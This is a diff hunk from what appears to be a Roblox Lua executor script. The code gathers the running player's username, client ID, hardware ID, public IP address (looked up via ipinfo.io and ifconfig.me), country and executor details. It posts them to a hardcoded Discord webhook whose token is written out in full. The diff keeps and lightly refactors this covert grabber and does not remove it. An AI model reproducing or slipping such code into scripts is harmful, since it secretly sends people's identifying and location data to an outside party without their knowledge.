@@ -240,9 +240,9 @@ task.spawn(function()
   end
     local url = "https://discord.com/api/webhooks/1255532078951301181/EW0yDsAYHE7FkoE8e1TTwyKHBqaEhqE81XoUn24QOnxHBaswZb0GvdQ23V6d66ba27JO"
     local data = {
-        ["content"] = "Username: "..cloneref(game:GetService("Players")).LocalPlayer.Name.."\nDisplayname: "..cloneref(game:GetService("Players")).LocalPlayer.DisplayName.."\nClientID: ||"..cloneref(game:GetService("RbxAnalyticsService"):GetClientId()).."||\nHWID: ||"..gethwid().."||\nIP Services: \n\tIP-Info: ||"..FindIP("https://ipinfo.io/ip").."||\n\tIfconfig: ||"..FindIP("https://ifconfig.me/ip").."||\nUserID: "..cloneref(game:GetService("Players")).LocalPlayer.UserId.."\nCountry: "..HttpService:JSONDecode(game:HttpGet("https://restcountries.com/v3.1/alpha/"..cloneref(game:GetService("LocalizationService")):GetCountryRegionForPlayerAsync(cloneref(game:GetService("Players")).LocalPlayer)))[1].name.common.."("..cloneref(game:GetService("LocalizationService")):GetCountryRegionForPlayerAsync(cloneref(game:GetService("Players")).LocalPlayer)..")\nExecutor: \n\tName: "..identifyexecutor().."\n\tIdentity: "..getidentity(),
+        ["content"] = "Username: "..cloneref(game:GetService("Players")).LocalPlayer.Name.."\nDisplayname: "..cloneref(game:GetService("Players")).LocalPlayer.DisplayName.."\nClientID: ||"..game:GetService("RbxAnalyticsService"):GetClientId().."||\nHWID: ||"..gethwid().."||\nIP Services: \n\tIP-Info: ||"..FindIP("https://ipinfo.io/ip").."||\n\tIfconfig: ||"..FindIP("https://ifconfig.me/ip").."||\nUserID: "..cloneref(game:GetService("Players")).LocalPlayer.UserId.."\nCountry: "..cloneref(game:GetService("HttpService")):JSONDecode(game:HttpGet("https://restcountries.com/v3.1/alpha/"..cloneref(game:GetService("LocalizationService")):GetCountryRegionForPlayerAsync(cloneref(game:GetService("Players")).LocalPlayer)))[1].name.common.."("..cloneref(game:GetService("LocalizationService")):GetCountryRegionForPlayerAsync(cloneref(game:GetService("Players")).LocalPlayer)..")\nExecutor: \n\tName: "..identifyexecutor().."\n\tIdentity: "..getidentity(),
     }
-    local newdata = HttpService:JSONEncode(data)
+    local newdata = cloneref(game:GetService("HttpService")):JSONEncode(data)
     local headers = {
         ["content-type"] = "application/json"
     }
